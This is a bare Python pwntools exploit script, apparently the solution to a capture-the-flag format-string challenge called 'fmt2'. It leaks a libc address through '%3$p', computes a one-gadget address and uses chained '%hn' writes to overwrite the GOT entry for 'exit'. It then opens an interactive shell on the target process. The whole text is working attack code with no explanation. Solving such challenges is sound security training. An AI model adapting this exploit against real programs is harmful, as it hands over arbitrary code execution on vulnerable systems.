from pwn import *
r = process("./fmt2")
e = ELF("./fmt2")
libc = ELF("./libc.so.6")
r.sendlineafter(b'name: ', b'%3$p')
r.recvuntil(b'guy,')
libc.address = int(r.recvline()[:-1],16) - libc.symbols['__write_nocancel']- 7
log.info(f'libc address :0x{libc.address:0x}')
payload = b''
xx = libc.address + 0xd5bf7 
n = 0
idx = 14 
while xx > 0:
    nn = xx & 0xffff
    if nn < n:
        nn += (1<<16) 
    payload += '%{}x%{}$hn'.format(nn-n, idx).encode()
    n = xx & 0xffff 
    idx += 1
    xx >>= 16 
payload = payload.ljust(8 * 6, b'a')
payload += p64(e.got['exit'])+p64(e.got['exit']+2)+p64(e.got['exit']+4)
r.sendlineafter(b'input:', payload)
r.interactive()
